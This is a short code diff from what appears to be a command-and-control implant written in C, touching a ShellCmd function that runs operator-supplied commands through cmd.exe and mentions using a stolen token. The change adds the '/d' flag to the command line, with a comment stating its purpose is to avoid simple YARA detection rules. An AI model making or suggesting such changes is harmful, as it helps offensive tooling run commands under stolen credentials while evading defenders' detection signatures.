@@ -73,7 +73,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     si.dwFlags      |= STARTF_USESTDHANDLES;
 
     /* Construct command line: cmd.exe /c "user_command" */
-    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", cmd);
+    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /d /c \"%s\"", cmd); // To avoid trivial yara rules
 
     /* Create the process - use stolen token if available */
     BOOL processCreated = FALSE;
